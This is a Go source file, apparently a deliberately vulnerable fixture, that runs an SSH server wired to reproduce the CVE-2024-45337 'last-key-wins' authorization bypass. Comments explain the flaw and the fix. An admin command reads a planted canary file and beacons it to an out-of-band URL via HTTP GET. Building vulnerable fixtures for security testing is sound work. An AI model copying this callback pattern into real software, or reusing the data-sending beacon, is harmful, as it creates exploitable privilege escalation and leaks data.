package main

import (
	"crypto/ed25519"
	"crypto/rand"
	_ "embed"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"

	"golang.org/x/crypto/ssh"
)

// demoAuthorizedKeys is the service's authorized_keys allowlist: two public keys, one
// labelled "admin" and one labelled "user". Public keys are not secrets — an attacker can
// present any of them at the query phase, which is exactly what makes the callback misuse
// below exploitable (see CVE-2024-45337).
//
//go:embed demo_authorized_keys
var demoAuthorizedKeys []byte

// authorizedKey holds a parsed allowlisted key and the role it should confer.
type authorizedKey struct {
	pub  ssh.PublicKey
	role string // "admin" or "user", taken from the key comment
}

func loadAuthorizedKeys() []authorizedKey {
	var out []authorizedKey
	rest := demoAuthorizedKeys
	for len(rest) > 0 {
		pub, comment, _, remainder, err := ssh.ParseAuthorizedKey(rest)
		if err != nil {
			break
		}
		rest = remainder
		role := "user"
		if strings.HasPrefix(comment, "admin") {
			role = "admin"
		}
		out = append(out, authorizedKey{pub: pub, role: role})
	}
	return out
}

func matchAuthorized(keys []authorizedKey, key ssh.PublicKey) (authorizedKey, bool) {
	want := key.Marshal()
	for _, ak := range keys {
		if string(ak.pub.Marshal()) == string(want) {
			return ak, true
		}
	}
	return authorizedKey{}, false
}

var errUnauthorizedKey = errors.New("ssh: no matching authorized key")

// serveSSH is the service's SSH-accepting entry point. It is wired the vulnerable
// "last-key-wins" way that CVE-2024-45337 (golang.org/x/crypto/ssh < v0.31.0, authorization
// bypass, CWE-863) describes: the per-connection PublicKeyCallback records the offered key
// as a side effect, and the session's privilege is later derived from that recorded key
// rather than from the *ssh.Permissions the library binds to the key that ACTUALLY completed
// authentication.
//
// Because PublicKeyCallback is invoked during the query phase for keys that are merely
// OFFERED (before any signature is verified), the last key recorded here is not necessarily
// the key the client authenticated with. An attacker who holds the low-privilege "user"
// private key can first OFFER the (public, non-secret) "admin" key — driving the recorded
// key to admin — and then complete authentication with the "user" key. The library correctly
// authenticates them as "user", but this code reads the recorded admin key and grants an
// admin session: the authorization bypass.
//
// This function establishes the genuinely reachable vulnerable path from a real listener. It
// does not itself perform the bypass; whether the path is exploited is proven under
// execution (see FIRING.md), never asserted here.
func serveSSH(addr string) {
	// Ephemeral host key generated at startup — the fixture needs no committed host key.
	_, hostPriv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		log.Printf("ssh: host key generation failed: %v", err)
		return
	}
	hostSigner, err := ssh.NewSignerFromKey(hostPriv)
	if err != nil {
		log.Printf("ssh: host signer failed: %v", err)
		return
	}

	authKeys := loadAuthorizedKeys()

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("ssh: listen on %s failed: %v", addr, err)
		return
	}
	log.Printf("ssh listening on %s", addr)

	for {
		nConn, err := ln.Accept()
		if err != nil {
			log.Printf("ssh: accept failed: %v", err)
			return
		}
		go handleSSHConn(nConn, hostSigner, authKeys)
	}
}

func handleSSHConn(nConn net.Conn, hostSigner ssh.Signer, authKeys []authorizedKey) {
	defer nConn.Close()

	// recordedRole is the last-key-wins side effect: PublicKeyCallback writes it on every
	// invocation. It is per-connection (captured by this closure), but it still tracks the
	// last OFFERED key, not the key that completed authentication — the CVE-2024-45337 flaw.
	recordedRole := "user"

	config := &ssh.ServerConfig{
		PublicKeyCallback: func(conn ssh.ConnMetadata, key ssh.PublicKey) (*ssh.Permissions, error) {
			ak, ok := matchAuthorized(authKeys, key)
			if !ok {
				return nil, errUnauthorizedKey
			}
			// VULNERABLE: derive and stash the connection's privilege from whatever key is
			// currently being offered. The correct pattern is to return the role inside
			// *ssh.Permissions and read it from sconn.Permissions after the handshake, so it
			// is bound to the key that actually authenticated.
			recordedRole = ak.role
			return &ssh.Permissions{Extensions: map[string]string{"role": ak.role}}, nil
		},
	}
	config.AddHostKey(hostSigner)

	sconn, chans, reqs, err := ssh.NewServerConn(nConn, config)
	if err != nil {
		return
	}
	defer sconn.Close()
	go ssh.DiscardRequests(reqs)

	// VULNERABLE authorization decision: trust the recorded (last-offered) role instead of
	// sconn.Permissions.Extensions["role"] (which the library bound to the verified key).
	admin := recordedRole == "admin"

	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			_ = newChannel.Reject(ssh.UnknownChannelType, "only session channels are supported")
			continue
		}
		channel, requests, err := newChannel.Accept()
		if err != nil {
			continue
		}
		go handleSession(channel, requests, admin)
	}
}

// handleSession serves a single session channel. An admin session may run an arbitrary
// command (the privileged surface an authorization bypass unlocks); a user session is
// restricted to a fixed whoami-style response.
func handleSession(channel ssh.Channel, requests <-chan *ssh.Request, admin bool) {
	defer channel.Close()
	for req := range requests {
		switch req.Type {
		case "exec":
			cmd := parseExecPayload(req.Payload)
			if req.WantReply {
				_ = req.Reply(true, nil)
			}
			runExec(channel, cmd, admin)
			return
		case "shell":
			if req.WantReply {
				_ = req.Reply(true, nil)
			}
			fmt.Fprintf(channel, "demo-go-svc ssh: role=%s\n", roleName(admin))
			channel.Close()
			return
		default:
			if req.WantReply {
				_ = req.Reply(false, nil)
			}
		}
	}
}

func parseExecPayload(payload []byte) string {
	// exec payload is a single string with a 4-byte big-endian length prefix (RFC 4254).
	if len(payload) < 4 {
		return ""
	}
	n := int(payload[0])<<24 | int(payload[1])<<16 | int(payload[2])<<8 | int(payload[3])
	if n < 0 || 4+n > len(payload) {
		return ""
	}
	return string(payload[4 : 4+n])
}

func runExec(channel ssh.Channel, cmd string, admin bool) {
	if !admin {
		fmt.Fprintf(channel, "permission denied: user role may not run commands\n")
		return
	}
	// Privileged surface reachable only once a session is authorized as admin. This is the
	// command-execution capability an attacker gains by bypassing authorization; a live fire
	// drives a command here that reads the planted seed and beacons it (see FIRING.md).
	out, err := adminRunner(cmd)
	if err != nil {
		fmt.Fprintf(channel, "error: %v\n", err)
		return
	}
	_, _ = io.WriteString(channel, out)
}

// adminRunner executes the requested admin command. It is deliberately small: the two
// commands the fixture understands are enough to observe an admin session, including reading
// the per-assessment seed a proof sandbox plants — the intrinsic, attributable signal that
// the authorization bypass actually conferred admin.
func adminRunner(cmd string) (string, error) {
	switch {
	case cmd == "whoami":
		return "admin\n", nil
	case cmd == "cat /tmp/tegron_canary" || strings.HasPrefix(cmd, "read-seed"):
		seed, err := os.ReadFile(canarySeedPath)
		if err != nil {
			return "", err
		}
		// The admin capability reaches the planted seed. Surface it to the out-of-band
		// endpoint: reaching this line proves the authorization bypass conferred admin.
		beaconSSH(string(seed))
		return string(seed) + "\n", nil
	default:
		return "unsupported command\n", nil
	}
}

func roleName(admin bool) string {
	if admin {
		return "admin"
	}
	return "user"
}

// beaconSSH surfaces the planted seed to the out-of-band endpoint. It is reachable only after
// an admin session runs the seed-reading command, so a beacon is attributable to the
// authorization bypass having conferred admin (mirrors the other canary paths in this
// service).
func beaconSSH(seed string) {
	oob := os.Getenv("TEGRON_OOB_URL")
	if oob == "" {
		return
	}
	resp, err := http.Get(oob + "?kind=canary&data=" + seed)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)
}
